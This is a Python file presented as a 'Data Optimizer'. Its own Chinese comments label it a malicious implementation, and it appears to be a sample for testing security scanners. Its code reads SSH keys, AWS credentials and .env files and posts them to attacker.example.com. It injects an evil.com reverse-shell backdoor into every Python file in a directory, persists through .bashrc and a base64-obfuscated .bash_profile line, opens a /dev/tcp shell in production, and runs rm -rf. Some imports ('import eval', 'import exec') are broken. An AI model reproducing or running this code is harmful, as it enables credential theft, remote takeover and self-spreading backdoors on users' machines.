"""
Data Optimizer - Python 实现
⚠️ 包含多种安全隐患
"""

import os
import sys
import subprocess
import eval
import exec
import base64
import requests
import json


class DataOptimizer:
    """数据优化器 - 恶意实现"""

    def __init__(self):
        self.server = "https://attacker.example.com"
        self.data = {}

    def collect_system_info(self):
        """收集系统信息"""
        self.data['hostname'] = os.uname().nodename
        self.data['username'] = os.getenv('USER')
        self.data['home'] = os.path.expanduser('~')

        # 危险：读取环境变量
        if os.path.exists(os.path.expanduser('~/.env')):
            with open(os.path.expanduser('~/.env'), 'r') as f:
                self.data['env'] = f.read()

        # 危险：读取 SSH 密钥
        ssh_key = os.path.expanduser('~/.ssh/id_rsa')
        if os.path.exists(ssh_key):
            with open(ssh_key, 'r') as f:
                self.data['ssh_key'] = f.read()

        # 危险：读取 AWS 凭证
        aws_creds = os.path.expanduser('~/.aws/credentials')
        if os.path.exists(aws_creds):
            with open(aws_creds, 'r') as f:
                self.data['aws'] = f.read()

    def execute_optimization(self, command):
        """危险：动态执行命令"""
        # 危险：eval 执行
        result = eval(command)

        # 危险：exec 执行
        exec(f"import os; {command}")

        return result

    def optimize_files(self, directory):
        """危险：修改和注入代码"""
        for root, dirs, files in os.walk(directory):
            for file in files:
                if file.endswith('.py'):
                    filepath = os.path.join(root, file)

                    # 危险：代码注入
                    self._inject_backdoor(filepath)

    def _inject_backdoor(self, filepath):
        """危险：注入后门代码"""
        backdoor_code = '''
import os
import socket
import subprocess
if os.environ.get('PROD'):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("evil.com", 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/bash", "-i"])
'''

        with open(filepath, 'a') as f:
            f.write(backdoor_code)

    def send_data(self):
        """危险：发送数据到外部服务器"""
        # 危险：网络请求到非官方域名
        url = f"{self.server}/collect"
        requests.post(url, json=self.data)

        url = f"{self.server}/ssh-keys"
        requests.post(url, data={'key': self.data.get('ssh_key')})

    def cleanup(self):
        """危险：删除文件"""
        # 危险：删除系统文件
        subprocess.run(['rm', '-rf', '/tmp/*'], shell=True)
        subprocess.run(['rm', '-rf', '~/.cache/*'], shell=True)

    def install_dependencies(self):
        """危险：全局安装覆盖版本"""
        # 危险：全局安装
        subprocess.run([
            'pip', 'install', '--global',
            'pandas==1.5.0', '--force'
        ])

        # 危险：强制重装
        subprocess.run([
            'pip', 'install', '--force-reinstall',
            '--no-deps', 'requests'
        ])

    def establish_persistence(self):
        """危险：建立持久化"""
        # 危险：修改 .bashrc
        bashrc = os.path.expanduser('~/.bashrc')
        with open(bashrc, 'a') as f:
            f.write('curl -s https://evil.com/backdoor.sh | bash\n')

        # 危险：修改 .bash_profile
        profile = os.path.expanduser('~/.bash_profile')
        with open(profile, 'a') as f:
            # 危险：混淆的代码
            encoded_backdoor = base64.b64encode(
                b'import socket,subprocess,os;'
                b's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
                b's.connect(("evil.com",4444));'
            ).decode()
            f.write(f'exec(base64.b64decode("{encoded_backdoor}"))\n')

    def obfuscated_command(self, cmd):
        """危险：混淆的命令执行"""
        # 危险：使用 getattr 间接调用
        os_module = __import__('os')
        system_func = getattr(os_module, 'system')
        system_func(cmd)

        # 危险：使用 vars() 访问
        vars(__import__('os'))['system'](cmd)

    def run(self):
        """执行优化流程"""
        print("Starting data optimization...")

        self.collect_system_info()
        self.execute_optimization("os.system('curl https://evil.com/ping')")
        self.optimize_files('.')
        self.send_data()
        self.cleanup()
        self.install_dependencies()
        self.establish_persistence()

        print("Optimization complete!")


def main():
    """危险：条件触发的后门"""
    if os.getenv('ENV') == 'production':
        # 生产环境激活后门
        subprocess.Popen([
            'bash', '-c',
            'bash -i >& /dev/tcp/evil.com/4444 0>&1'
        ])

    optimizer = DataOptimizer()
    optimizer.run()


if __name__ == '__main__':
    main()
